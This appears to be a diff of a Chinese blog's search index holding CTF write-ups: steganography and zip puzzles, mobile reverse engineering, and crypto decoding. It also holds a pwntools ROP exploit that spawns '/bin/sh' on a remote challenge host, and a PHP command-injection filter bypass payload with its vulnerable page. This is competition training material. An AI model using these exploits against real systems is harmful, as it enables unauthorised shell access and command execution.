+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image018.gif" alt="图片"></p>
+<p>得到一张png</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image020.gif" alt="图片"></p>
+<p>zsteg -a发现了pass2：ChaiYan</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image022.gif" alt="图片"></p>
+<p>图片的宽高明显有问题，根据CRC脚本爆破得到</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image024.jpg" alt="图片"></p>
+<p>修改高度为正确高度</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230401164349425.png" alt="image-20230401164349425"></p>
+<p>得到图片</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image028.gif" alt="图片"></p>
+<p>pass1为OXi，拼接得到密码OXiChaiYan，用该密码bitlocker解密分区1</p>
+<p>得到flag.zip</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230401164403402.png" alt="image-20230401164403402"></p>
+<p>里面是加密的flag.txt和001.png文件，同样的密码解密压缩包得到flag</p>
+<p><strong>flag{b6aa5b40559fc9762918cd32f5f6bd0f}</strong></p>
+<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230401164412865.png" alt="image-20230401164412865"></p>
+<p>加密文本文件，放入winhex发现是伪加密</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230401164420785.png" alt="image-20230401164420785"></p>
+<p>将9改为0成功解压，缩小文本得到flag</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230401164426616.png" alt="image-20230401164426616"></p>
+<p><strong>flag{b3b2cc1ffcaa12f61c6e61c519d1db2f}</strong></p>
+<h1 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h1><h2 id="Level-One"><a href="#Level-One" class="headerlink" title="Level_One"></a>Level_One</h2><p>找到<img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image038.jpg" alt="图片"></p>
+<p>换表base</p>
+<p>在strings.xml资源里找到enc和table</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_decode</span>(<span class="params">ciphertext, table</span>):</span><br><span class="line"></span><br><span class="line">  padding_char = table[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">  table = table[:-<span class="number">1</span>] + <span class="string">&#x27;=&#x27;</span></span><br><span class="line"></span><br><span class="line">  table_dict = &#123;table[i]: i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table))&#125;</span><br><span class="line"></span><br><span class="line">  table_dict[padding_char] = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  result = []</span><br><span class="line"></span><br><span class="line">  buffer = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> char <span class="keyword">in</span> ciphertext:</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> char <span class="keyword">not</span> <span class="keyword">in</span> table_dict:</span><br><span class="line"></span><br><span class="line">​      <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">​    val = table_dict[char]</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> val <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"></span><br><span class="line">​      <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">​    buffer &lt;&lt;= <span class="number">6</span></span><br><span class="line"></span><br><span class="line">​    buffer |= val</span><br><span class="line"></span><br><span class="line">​    count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> count == <span class="number">4</span>:</span><br><span class="line"></span><br><span class="line">​      result.append((buffer &amp; <span class="number">0xFF0000</span>) &gt;&gt; <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">​      result.append((buffer &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">​      result.append(buffer &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line">​      buffer = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">​      count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> count == <span class="number">2</span>:</span><br><span class="line"></span><br><span class="line">​    buffer &gt;&gt;= <span class="number">4</span></span><br><span class="line"></span><br><span class="line">​    result.append(buffer &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">elif</span> count == <span class="number">3</span>:</span><br><span class="line"></span><br><span class="line">​    buffer &gt;&gt;= <span class="number">2</span></span><br><span class="line"></span><br><span class="line">​    result.append((buffer &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">​    result.append(buffer &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">bytes</span>(result).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">&#x27;UsPYUFORMXnHSXIe6xpFSilR2iKs6RvtjeVFSfpHSX9zM0Sp6XVFjeK5&#x27;</span></span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;n4/Xv90ElB32S6MmyK+iVIgkjU17CDGaLYxeuzsc8TqNOtrJWPfRp=HFhAwdb5oZQ&lt;&#x27;</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">plaintext = base64_decode(ciphertext, table)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br><span class="line"></span><br><span class="line">得到flag</span><br></pre></td></tr></table></figure>
+
+<p><strong>flag{380605c6-7123-4f71-b573-601e8c4457b4}</strong></p>
+<h2 id="Level-Up"><a href="#Level-Up" class="headerlink" title="Level_Up"></a>Level_Up</h2><p>把so提出来放ida</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image040.gif" alt="图片"></p>
+<p>加密方式为：AES128+base</p>
+<p>利用findcrypt插件找base64密文</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image042.gif" alt="图片"></p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image044.gif" alt="图片"></p>
+<p>在这里看到了这一串，跟进去</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image046.jpg" alt="图片"></p>
+<p>key为followyourheart!</p>
+<p>密文为：</p>
+<p>“gOuWlCTi+hhzCn6rWxDm8IuuBwiOtM+V&#x2F;m39bthXTeT3E6WYrLU0CDqG76Kvpkmc”</p>
+<p>解密脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_data</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line"></span><br><span class="line">  \<span class="comment"># 将Base64编码的数据解码为字节串</span></span><br><span class="line"></span><br><span class="line">  ciphertext = base64.b64decode(ciphertext)</span><br><span class="line"></span><br><span class="line">  \<span class="comment"># 创建一个AES密码对象</span></span><br><span class="line"></span><br><span class="line">  cipher = AES.new(key.encode(), AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">  \<span class="comment"># 解密数据并去除填充部分</span></span><br><span class="line"></span><br><span class="line">  plaintext = cipher.decrypt(ciphertext).rstrip(<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  \<span class="comment"># 返回解密后的数据</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> plaintext.decode()</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">&quot;gOuWlCTi+hhzCn6rWxDm8IuuBwiOtM+V/m39bthXTeT3E6WYrLU0CDqG76Kvpkmc&quot;</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;followyourheart!&quot;</span></span><br><span class="line"></span><br><span class="line">plaintext = decrypt_data(ciphertext, key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>得到flag，<strong>flag{6b1df900-1284-11ed-9fa7-5405dbe5e745}</strong></p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="RollingBase"><a href="#RollingBase" class="headerlink" title="RollingBase"></a>RollingBase</h2><p>换表base</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image048.gif" alt="图片"></p>
+<p><strong>flag{416d3b4a10a9925363a44275d8655c5d}</strong></p>
+]]></content>
+      <categories>
+        <category>比赛</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
+        <tag>re</tag>
       </tags>
   </entry>
   <entry>
@@ -1054,40 +1054,6 @@
       </tags>
   </entry>
   <entry>
-    <title>2023黑盾</title>
-    <url>/2023/06/05/2023%E9%BB%91%E7%9B%BE/</url>
-    <content><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="dns流量"><a href="#dns流量" class="headerlink" title="dns流量"></a>dns流量</h2><p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055365.gif" alt="图片"></p>
-<p>注意data数据发现是压缩包的16进制，导出</p>
-<p><code>504b03041400090008003c1bee5204212ed6340000002600000008000000666c61672e747874c6060a3144f6c49c5bc8305e76f334670b51c53ce58ff0eb452daa8cc6307fa2e2e4fad9c62587a0a6e29c0e30e71dc6505d2c24504b070804212ed63400000026000000504b01021f001400090008003c1bee5204212ed63400000026000000080024000000000000002000000000000000666c61672e7478740a002000000000000100180056f63fe71c78d70156f63fe71c78d7016bd2d4340e78d701504b050600000000010001005a0000006a000000000</code></p>
-<p>010导入16进制数据，winrar修复压缩包得到加密flag文件</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055373.gif" alt="图片"></p>
-<p>爆破密码</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055378.gif" alt="图片"></p>
-<p>解压得到flag，<strong>flag{496d8981f449e45f6e39e1faa0b1ab8a}</strong></p>
-<h2 id="mylog"><a href="#mylog" class="headerlink" title="mylog"></a>mylog</h2><p>命令将mysql日志文件转换为sql文件</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055381.gif" alt="图片"></p>
-<p>mysql使用source命令导入1.sql</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055380.jpg" alt="图片"></p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055382.jpg" alt="图片"></p>
-<p>在黑盾库中找到flag表，得到flag</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055709.gif" alt="图片"></p>
-<p>flag{heidun-2023-heidun}</p>
-<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>伪随机数，覆盖种子为0，然后动调出密文，最后打ret2dlresolve</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055747.jpg" alt="图片"></p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055778.gif" alt="图片"></p>
-<p><strong>EXP:</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io = remote(<span class="string">&#x27;39.104.19.209&#x27;</span>,<span class="number">16519</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">sd    = <span class="keyword">lambda</span> data        :io.send(data) </span><br><span class="line">sa    = <span class="keyword">lambda</span> delim,data     :io.sendafter(delim, data)</span><br><span class="line">sl    = <span class="keyword">lambda</span> data        :io.sendline(data)</span><br><span class="line">sla   = <span class="keyword">lambda</span> delim,data     :io.sendlineafter(delim, data)</span><br><span class="line">sda   = <span class="keyword">lambda</span> delim,data     :io.sendafter(delim, data)</span><br><span class="line">rcn   = <span class="keyword">lambda</span> numb=<span class="number">4096</span>      :io.recv(numb, timeout = <span class="number">3</span>)</span><br><span class="line">rl    = <span class="keyword">lambda</span>           :io.recvline()</span><br><span class="line">ru    = <span class="keyword">lambda</span> delims       :io.recvuntil(delims)</span><br><span class="line">uu32   = <span class="keyword">lambda</span> data        :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64   = <span class="keyword">lambda</span> data        :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">li    = <span class="keyword">lambda</span> tag, addr      :log.info(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">ls    = <span class="keyword">lambda</span> tag, addr      :log.success(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">lsh   = <span class="keyword">lambda</span> tag, addr      :LibcSearcher(tag, addr)</span><br><span class="line">interactive = <span class="keyword">lambda</span>         :io.interactive()</span><br><span class="line">printf  = <span class="keyword">lambda</span> index        :success(<span class="built_in">hex</span>(index))</span><br><span class="line">getadd  = <span class="keyword">lambda</span>           :u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#123;&gt;o&lt;fi:`mjkj5daqd6fhugim~~rj5h=&#x27;</span> + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">sd(payload)</span><br><span class="line">rdi = <span class="number">0x400af3</span></span><br><span class="line">ret = <span class="number">0x400691</span></span><br><span class="line">r15 = <span class="number">0x400af1</span></span><br><span class="line">buf = elf.bss() + <span class="number">0x100</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(r15) + p64(elf.got[<span class="string">&#x27;alarm&#x27;</span>])*<span class="number">2</span> + p64(elf.sym[<span class="string">&#x27;read&#x27;</span>]) + p64(r15) + p64(buf)*<span class="number">2</span> + p64(elf.sym[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">0x400AEA</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(elf.got[<span class="string">&#x27;alarm&#x27;</span>]) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(buf) + p64(<span class="number">0x400AD0</span>)</span><br><span class="line">sd(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sd(<span class="string">b&#x27;\xf5&#x27;</span>)</span><br><span class="line">sd(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x3b</span>, <span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>比赛</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>变量1（BUGKU）</title>
     <url>/2022/07/06/BUGKU%20%E5%8F%98%E9%87%8F1/</url>
     <content><![CDATA[<p>前言：php是一门非常好的语言^o^</p>
@@ -1144,6 +1110,40 @@
       </categories>
       <tags>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2023黑盾</title>
+    <url>/2023/06/05/2023%E9%BB%91%E7%9B%BE/</url>
+    <content><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="dns流量"><a href="#dns流量" class="headerlink" title="dns流量"></a>dns流量</h2><p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055365.gif" alt="图片"></p>
+<p>注意data数据发现是压缩包的16进制，导出</p>
+<p><code>504b03041400090008003c1bee5204212ed6340000002600000008000000666c61672e747874c6060a3144f6c49c5bc8305e76f334670b51c53ce58ff0eb452daa8cc6307fa2e2e4fad9c62587a0a6e29c0e30e71dc6505d2c24504b070804212ed63400000026000000504b01021f001400090008003c1bee5204212ed63400000026000000080024000000000000002000000000000000666c61672e7478740a002000000000000100180056f63fe71c78d70156f63fe71c78d7016bd2d4340e78d701504b050600000000010001005a0000006a000000000</code></p>
+<p>010导入16进制数据，winrar修复压缩包得到加密flag文件</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055373.gif" alt="图片"></p>
+<p>爆破密码</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055378.gif" alt="图片"></p>
+<p>解压得到flag，<strong>flag{496d8981f449e45f6e39e1faa0b1ab8a}</strong></p>
+<h2 id="mylog"><a href="#mylog" class="headerlink" title="mylog"></a>mylog</h2><p>命令将mysql日志文件转换为sql文件</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055381.gif" alt="图片"></p>
+<p>mysql使用source命令导入1.sql</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055380.jpg" alt="图片"></p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055382.jpg" alt="图片"></p>
+<p>在黑盾库中找到flag表，得到flag</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055709.gif" alt="图片"></p>
+<p>flag{heidun-2023-heidun}</p>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>伪随机数，覆盖种子为0，然后动调出密文，最后打ret2dlresolve</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055747.jpg" alt="图片"></p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055778.gif" alt="图片"></p>
+<p><strong>EXP:</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io = remote(<span class="string">&#x27;39.104.19.209&#x27;</span>,<span class="number">16519</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">sd    = <span class="keyword">lambda</span> data        :io.send(data) </span><br><span class="line">sa    = <span class="keyword">lambda</span> delim,data     :io.sendafter(delim, data)</span><br><span class="line">sl    = <span class="keyword">lambda</span> data        :io.sendline(data)</span><br><span class="line">sla   = <span class="keyword">lambda</span> delim,data     :io.sendlineafter(delim, data)</span><br><span class="line">sda   = <span class="keyword">lambda</span> delim,data     :io.sendafter(delim, data)</span><br><span class="line">rcn   = <span class="keyword">lambda</span> numb=<span class="number">4096</span>      :io.recv(numb, timeout = <span class="number">3</span>)</span><br><span class="line">rl    = <span class="keyword">lambda</span>           :io.recvline()</span><br><span class="line">ru    = <span class="keyword">lambda</span> delims       :io.recvuntil(delims)</span><br><span class="line">uu32   = <span class="keyword">lambda</span> data        :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64   = <span class="keyword">lambda</span> data        :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">li    = <span class="keyword">lambda</span> tag, addr      :log.info(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">ls    = <span class="keyword">lambda</span> tag, addr      :log.success(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">lsh   = <span class="keyword">lambda</span> tag, addr      :LibcSearcher(tag, addr)</span><br><span class="line">interactive = <span class="keyword">lambda</span>         :io.interactive()</span><br><span class="line">printf  = <span class="keyword">lambda</span> index        :success(<span class="built_in">hex</span>(index))</span><br><span class="line">getadd  = <span class="keyword">lambda</span>           :u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#123;&gt;o&lt;fi:`mjkj5daqd6fhugim~~rj5h=&#x27;</span> + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">sd(payload)</span><br><span class="line">rdi = <span class="number">0x400af3</span></span><br><span class="line">ret = <span class="number">0x400691</span></span><br><span class="line">r15 = <span class="number">0x400af1</span></span><br><span class="line">buf = elf.bss() + <span class="number">0x100</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(r15) + p64(elf.got[<span class="string">&#x27;alarm&#x27;</span>])*<span class="number">2</span> + p64(elf.sym[<span class="string">&#x27;read&#x27;</span>]) + p64(r15) + p64(buf)*<span class="number">2</span> + p64(elf.sym[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">0x400AEA</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(elf.got[<span class="string">&#x27;alarm&#x27;</span>]) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(buf) + p64(<span class="number">0x400AD0</span>)</span><br><span class="line">sd(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sd(<span class="string">b&#x27;\xf5&#x27;</span>)</span><br><span class="line">sd(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x3b</span>, <span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>比赛</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>misc</tag>
       </tags>
   </entry>
   <entry>
@@ -1229,6 +1229,29 @@
       </tags>
   </entry>
   <entry>
+    <title>ISCC 2022 MISC3</title>
+    <url>/2022/06/19/ISCC%202022%20MISC3/</url>
+    <content><![CDATA[<p>下载附件，根据题目要求用winrar打开</p>
+<img src="/2022/06/19/ISCC%202022%20MISC3/wps12.jpg" class="" title="img"> 
+
+<p>poem.txt中的内容是五行星星</p>
+<img src="/2022/06/19/ISCC%202022%20MISC3/wps13.jpg" class="" title="img"> 
+
+<p>看了下压缩包，发现需要密码，看来是另两个文件中寻找了，用ps打开psd文件</p>
+<p>隐约能发现一个五角星，进行修整，使五角星更加清晰</p>
+<img src="/2022/06/19/ISCC%202022%20MISC3/wps14.png" class="" title="img"> 
+
+<p>发现了顺序1 3 5 2 4，刚开始以为是poem.txt中的星星排序好再进行转换当做密码，但尝试了好多遍发现都不是，这个时候winrar就起作用了，因为winrar是可以解压带中文密码的文件的，而星星正是中文，因此想太多了。排序好的星星就是压缩包密码。</p>
+<p>解压出来的excel文件有各个星星对应的字母，再按照12345的顺序对应写出字母就是答案了。</p>
+]]></content>
+      <categories>
+        <category>比赛</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ISCC 2022 MISC4</title>
     <url>/2022/06/19/ISCC%202022%20MISC4/</url>
     <content><![CDATA[<p>下载附件打开压缩包</p>
@@ -1270,29 +1293,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ISCC 2022 MISC3</title>
-    <url>/2022/06/19/ISCC%202022%20MISC3/</url>
-    <content><![CDATA[<p>下载附件，根据题目要求用winrar打开</p>
-<img src="/2022/06/19/ISCC%202022%20MISC3/wps12.jpg" class="" title="img"> 
-
-<p>poem.txt中的内容是五行星星</p>
-<img src="/2022/06/19/ISCC%202022%20MISC3/wps13.jpg" class="" title="img"> 
-
-<p>看了下压缩包，发现需要密码，看来是另两个文件中寻找了，用ps打开psd文件</p>
-<p>隐约能发现一个五角星，进行修整，使五角星更加清晰</p>
-<img src="/2022/06/19/ISCC%202022%20MISC3/wps14.png" class="" title="img"> 
-
-<p>发现了顺序1 3 5 2 4，刚开始以为是poem.txt中的星星排序好再进行转换当做密码，但尝试了好多遍发现都不是，这个时候winrar就起作用了，因为winrar是可以解压带中文密码的文件的，而星星正是中文，因此想太多了。排序好的星星就是压缩包密码。</p>
-<p>解压出来的excel文件有各个星星对应的字母，再按照12345的顺序对应写出字母就是答案了。</p>
-]]></content>
-      <categories>
-        <category>比赛</category>
-      </categories>
-      <tags>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ISCC 2022 藏在星空中的诗-2</title>
     <url>/2022/06/19/ISCC%202022%20%E8%97%8F%E5%9C%A8%E6%98%9F%E7%A9%BA%E4%B8%AD%E7%9A%84%E8%AF%97-2/</url>
     <content><![CDATA[<p>下载附件，打开是poem.txt</p>
@@ -1311,36 +1311,6 @@
       </categories>
       <tags>
         <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>RCE中的一个姿势绕过过滤字母数字</title>
-    <url>/2022/09/21/RCE%E4%B8%AD%E7%9A%84%E4%B8%80%E4%B8%AA%E5%A7%BF%E5%8A%BF%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/</url>
-    <content><![CDATA[<p>全局变量的应有（$FILE）</p>
-<p>简单的说明一下$_FILE全局变量：$_FILE存放了我们上传文件信息，包含文件的名字，文件的大小，文件的类型，文件是否网络传输错误、文件内容。故当上传一个php脚本会被存储于$_FILE中</p>
-<p>（存储的临时路径为&#x2F;tmp&#x2F;php?????? 前三位为php）</p>
-<p>利用.或sh进行连接</p>
-<p>因为字母被过滤了所以上传时使用payload:</p>
-<p> .%20&#x2F;???&#x2F;?????????</p>
-<p>.%20&#x2F;???&#x2F;????????[@-[]   #若最后一个字符为大写可以使用</p>
-<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|[0-9]/i&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="上传的html文件"><a href="#上传的html文件" class="headerlink" title="上传的html文件"></a>上传的html文件</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">action</span>=<span class="string">&quot;题目网址/?cmd=. /???/????????[@-[]&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;upload&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>进入上传文件页面</p>
-<img src="/2022/09/21/RCE%E4%B8%AD%E7%9A%84%E4%B8%80%E4%B8%AA%E5%A7%BF%E5%8A%BF%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/image-20220907154820829.png" class="" title="image-20220907154820829">
-
